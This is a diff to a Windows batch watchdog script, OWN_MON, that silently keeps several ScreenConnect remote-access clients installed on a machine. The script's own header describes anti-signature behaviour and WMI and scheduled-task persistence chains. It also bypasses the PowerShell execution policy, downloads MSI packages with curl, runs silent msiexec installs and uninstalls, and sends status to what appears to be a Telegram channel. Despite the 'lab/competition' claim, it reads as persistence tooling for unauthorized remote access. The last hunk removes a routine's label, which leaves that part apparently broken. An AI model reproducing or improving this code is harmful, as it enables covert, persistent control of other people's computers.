@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M26
+rem  OWN_MON  BUILD 20260802M27
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
-rem  WMI+schtasks chains, MSI fallback, MUST-RUN gryxa, quiet digest.
+rem  WMI+schtasks, MUST-RUN gryxa, protect siblings from msiexec /i wipe.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -36,7 +36,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M26"
+set "MONVER=M27"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -200,13 +200,25 @@ if not errorlevel 1 (
   set "PRIM_OK=1"
   goto :AfterHeal
 )
-rem refuse fresh /i if product still registered - Upgrade table can wipe ALT
+rem refuse fresh /i if product still registered - Upgrade table can wipe ALT/GRYXA
 set "REGSTATE=unknown"
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
 if /I "!REGSTATE!"=="yes" (
   echo primary_registered_skip_fresh_install>>"%LOG%"
   powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "registered-stuck" >nul 2>&1
-  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT"
+  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT/GRYXA"
+  goto :AfterHeal
+)
+rem O37: refuse sevrz /i when gryxa already present — shared legacy UpgradeCodes
+rem {0C94448B}/{1F85D7FE} make sibling msiexec /i knock Gryxa OFFLINE in panel.
+set "GREG=unknown"
+if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if not errorlevel 1 set "GREG=yes"
+if /I "!GREG!"=="yes" (
+  echo primary_skip_i_protect_gryxa>>"%LOG%"
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "protect-gryxa-skip-primary-i" >nul 2>&1
+  call :TgState DOWN "Primary missing - refused sevrz /i to protect Gryxa (shared SC UpgradeCodes); /fa only"
   goto :AfterHeal
 )
 if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
@@ -236,6 +248,7 @@ if "%INSTALLED%"=="0" (
   )
 )
 call :RestoreAlt
+call :EnsureGryxaMust
 if "%INSTALLED%"=="0" (
   if exist "%WD%\msi_heal.log" (
     echo --- msi_heal.log tail --->>"%LOG%"
@@ -362,7 +375,7 @@ if not errorlevel 1 (
   )
 )
 
-rem 2) registered product -> msiexec /fa repair (safe for siblings)
+rem 2) registered product -> msiexec /fa repair ONLY (never /i on top — kills panel session)
 set "GREG=unknown"
 if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
 echo gryxa_registered=!GREG!>>"%LOG%"
@@ -379,7 +392,17 @@ if /I "!GREG!"=="yes" (
     echo gryxa_repaired_ok>>"%LOG%"
     exit /b 0
   )
-  echo gryxa_repair_not_running_force_install>>"%LOG%"
+  rem clean reinstall: /x then /i (safer than /i over registered — avoids Upgrade churn)
+  echo gryxa_clean_reinstall_begin>>"%LOG%"
+  if exist "%WD%\own_lib.ps1" (
+    for /f "usebackq delims=" %%G in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$n='ScreenConnect Client (%GRYXA_FP%)'; foreach($r in @('HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')){ if(Test-Path $r){ Get-ChildItem $r -EA 0 | %% { $p=Get-ItemProperty $_.PSPath -EA 0; if($p.DisplayName -eq $n -and $_.PSChildName -like '{*}'){ $_.PSChildName; break } } } }"`) do set "GGUID=%%G"
+  )
+  if defined GGUID (
+    call :NoMsiPolicy
+    msiexec /x !GGUID! /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
+    echo gryxa_uninstall_exit=!ERRORLEVEL!>>"%LOG%"
+    timeout /t 8 /nobreak >nul
+  )
 )
 
 rem 3) orphan service (present, not registered) -> delete then fresh install
@@ -397,7 +420,7 @@ if /I not "!GREG!"=="yes" (
   )
 )
 
-rem 4) fresh MSI install - mandatory (gryxa FP; do not skip if registered-stuck)
+rem 4) fresh MSI install only when product not currently Running
 echo gryxa_install_begin>>"%LOG%"
 if not exist "%CURL%" set "CURL=curl.exe"
 set "G_MSI_READY=0"
@@ -512,9 +535,10 @@ if "!MSIEXIT!"=="1618" (
   echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
 )
 call :WaitSvc
+call :RestoreAlt
+rem O37: sevrz /i shares legacy UpgradeCodes with gryxa — always re-ensure Gryxa after
+call :EnsureGryxaMust
 exit /b 0
-
-:RepairRegistered
 rem %1=fingerprint - service deleted but product registered: repair by GUID.
 sc query "ScreenConnect Client (%~1)" >nul 2>&1
 if not errorlevel 1 exit /b 0
